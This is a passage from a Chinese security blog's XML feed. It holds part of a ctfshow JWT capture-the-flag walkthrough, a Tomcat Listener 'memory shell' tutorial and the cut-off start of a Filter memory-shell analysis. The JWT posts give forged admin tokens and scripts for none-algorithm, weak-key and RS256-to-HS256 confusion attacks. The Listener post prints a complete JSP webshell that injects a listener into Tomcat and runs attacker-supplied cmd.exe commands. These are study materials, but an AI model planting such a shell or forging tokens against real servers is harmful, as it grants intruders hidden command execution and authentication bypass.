class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signature</span><br><span class="line">由前面两部分base64加密后用.连接并进行header中声明的方式去加密</span><br></pre></td></tr></table></figure><p>jwt就是上面三个通过.进行连接<br>jwt解密网站<br><a href="https://jwt.io/">https://jwt.io/</a></p><h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>通过base64解码得到的cookie<br><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NzAxODc4NTEsImV4cCI6MTY3MDE5NTA1MSwibmJmIjoxNjcwMTg3ODUxLCJzdWIiOiJ1c2VyIiwianRpIjoiOTVhZDIwMzA1NTY2NmE2ZDBhZjBiY2M2NDc5OTMwYmIifV0</code><br>得到<br><code>&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1670187851,&quot;exp&quot;:1670195051,&quot;nbf&quot;:1670187851,&quot;sub&quot;:&quot;user&quot;,&quot;jti&quot;:&quot;95ad203055666a6d0af0bcc6479930bb&quot;&#125;]</code><br>将user改成admin以后在进行加密<br><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0AW3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NzAxODc4NTEsImV4cCI6MTY3MDE5NTA1MSwibmJmIjoxNjcwMTg3ODUxLCJzdWIiOiJhZG1pbiIsImp0aSI6Ijk1YWQyMDMwNTU2NjZhNmQwYWYwYmNjNjQ3OTkzMGJiIn1d</code><br>并用此cookie去访问/admin，就行了</p><h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>通过 <a href="https://jwt.io/">https://jwt.io/</a> 进行解密<br>修改为admin后，猜测密钥是123456，并重新加密<br><img src="/2022/12/05/ctfshow-jwt/1.jpg" alt></p><h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>与web346相同，密钥也相同</p><h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>通过脚本爆破<br><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><h2 id="we349"><a href="#we349" class="headerlink" title="we349"></a>we349</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line"><span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>由get的路由，可以知道通过private.key对jwt进行加密<br>我们访问/private.key，拿到私钥<br>通过python进行加密<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pip install pyjwt</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;private.key&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">payload=&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="string">&#x27;RS256&#x27;</span>))</span><br><span class="line"><span class="comment"># eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.NoE2xAUmDyHc0rhNtNtUn8URhEZeFGy9M0hd7hBEfRD3jpGqetn0nj2Tm9mob9LWyl2BazTLm_1Ez1vn0A6ZxgcpF73B6_rE4zrDvyu3b6eH3FtwmKd9I6N0KzkO1IpTggRVy6l4RoQCoG4JJ6X9YVJgOWtm0vgWzcjjXejlEsM</span></span><br></pre></td></tr></table></figure></p><h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//routes/private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line"><span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//routes/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">jwt.<span class="title function_">verify</span>(auth, cert,<span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>+err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里只能获取到public.key，这时候可以更改RS256为HS256，在后端进行校验的时候就会使用HS256进行验证，且我们知道密钥为public.key<br>利用nodejs进行加密，保证版本相同<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/miuzzx/article/details/111936737">https://blog.csdn.net/miuzzx/article/details/111936737</a></li><li><a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;基本原理&quot;&gt;&lt;a href=&quot;#基本原理&quot; class=&quot;headerlink&quot; title=&quot;基本原理&quot;&gt;&lt;/a&gt;基本原理&lt;/h2&gt;&lt;p&gt;jwt一共有三部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;header&lt;/li&gt;
&lt;li&gt;payload&lt;/li&gt;
&lt;li&gt;signature&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="jwt" scheme="http://example.com/tags/jwt/"/>
    
    <category term="ctfshow" scheme="http://example.com/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>Listener内存马</title>
    <link href="http://example.com/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2022-12-04T20:17:43.000Z</published>
    <updated>2022-12-04T20:49:20.873Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>讲解Listener内存马原理，和简单实现<br><span id="more"></span></p><h2 id="Listener加载原理"><a href="#Listener加载原理" class="headerlink" title="Listener加载原理"></a>Listener加载原理</h2><p><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg" alt><br>还是这张图，Listener是在最开始就被创建的</p><p>Listener一共有8个监听器接口，但是由于内存马的特殊性，一般是在ServletRequestListener接口进行内存马注入，该接口用于监听 ServletRequest 对象的创建和销毁过程，而每次访问服务器都会触发此接口</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>前期准备可以看看Filter内存马的文章</p><p>先写一个Listener的容器，实现了ServletRequestListener接口，用注解的方式进行注册<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了TestListener requestInitialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了TestListener requestDestroyed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在requestInitialized处打上断点，根据调用栈，可以知道是<code>context.fireRequestInitEvent(request.getRequest())</code>进行了初始化<br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/2.jpg" alt><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/3.jpg" alt></p><p>context是由<code>request.getContext();</code>初始化，在后续利用需要<br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/4.jpg" alt></p><p>进入<code>context.fireRequestInitEvent</code>函数，可以看到是由listener进行了监听器初始化，且listener来源于<code>getApplicationEventListeners();</code><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/5.jpg" alt><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/6.jpg" alt></p><h2 id="内存马实现"><a href="#内存马实现" class="headerlink" title="内存马实现"></a>内存马实现</h2><p>通过上面的分析，我们可以知道，只需要往applicationEventListenersList中加入我们的Listener对象就可以了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmdl&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (NoSuchFieldException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">aELL</span> <span class="operator">=</span> context.getClass().getDeclaredField(<span class="string">&quot;applicationEventListenersList&quot;</span>);</span><br><span class="line">    aELL.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">List</span> <span class="variable">applicationEventListenersList</span> <span class="operator">=</span> (List)aELL.get(context);</span><br><span class="line">    <span class="type">MyListener</span> <span class="variable">listenerDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyListener</span>();</span><br><span class="line">    applicationEventListenersList.add(listenerDemo);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><br>根据前面的分析，context是由<code>request.getContext();</code>得到的，所以写内存马的时候也可以通过同样的方式获取</p><p>增加applicationEventListenersList，这里我是通过反射的方式获取到了private属性的applicationEventListenersList，然后进行了一次add<br>当然也可以通过context提供的成员方法进行修改<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">standardContext.addApplicationEventListener(listenerDemo);</span><br></pre></td></tr></table></figure></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://xz.aliyun.com/t/10358">https://xz.aliyun.com/t/10358</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;讲解Listener内存马原理，和简单实现&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="内存马" scheme="http://example.com/categories/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="内存马" scheme="http://example.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Filter内存马</title>
    <link href="http://example.com/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2022-12-04T18:24:16.000Z</published>
    <updated>2022-12-04T21:02:02.194Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对Filter内存马原理的简单分析<br><span id="more"></span></p><h2 id="Filter注册流程"><a href="#Filter注册流程" class="headerlink" title="Filter注册流程"></a>Filter注册流程</h2><p>用一张图来描述一下tomcat的基本加载流程<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg" alt><br>可以看到FilterChain是在WrapperValue容器中调用的<br>而FilterChain，顾名思义，就是一个Filter的链，从第一个Filter一直传到最后一个Filter，然后才调用Servlet</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>首先调试Filter内存马需要先在pom.xml加<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.67<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这里的version我选得是和我tomcat的版本一样，不知道有没有联系<br><strong>不加次依赖是无法调试的</strong></p><p>先写一个简单的Filter容器<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterA</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;a: before&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        pw.write(<span class="string">&quot;aaaaaaaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        System.out.println(<span class="string">&quot;a: after&quot;</span>);</span><br><span class="line"></span><br><span class="line">        pw.write(<span class="string">&quot;&lt;br&gt;back&quot;</span>);</span><br><span class="line">        pw.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在doFilter第一行代码下断点，根据调用栈可以看到WrapperValue容器<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/2.jpg" alt></p><p>进入WrapperValue，往上翻找可以看到filterChain的来源，在此处下断点，重新调试<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/3.jpg" alt></p><p>进入createFilterChain，注意到这一行代码，可以看到这里面有我们的Filter链，是一个Map，另外一条应该是tomcat自带的filter，这行就是从context对象中获取现有的Filter链<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/4.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/5.jpg" alt></p><p>往下到了一个循环处，是根据上面得到的filterMap，去依次从context中取出filterConfig<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/6.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/7.jpg" alt></p><p>获取到filterConfig后就会将filterConfig加入filterChain中，该filterChain对象中的filters列表会添加filterConfig<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/8.jpg" alt></p><p>创建完FilterChain后，来到filterChain的doFilter方法<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/9.jpg" alt></p><p>跟着调试，会进入internalDofilter方法，n是Filter个数，pos是当前是第几个Filter<br>首先会取出当前的filterConfig，并通过getFilter函数，从filterConfig取出filter对象<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/10.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/11.jpg" alt></p><p>最后拿到filter对象了，通过doFilter调用具体的Filter，也就是我们写的那个demo<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/12.jpg" alt><br><img 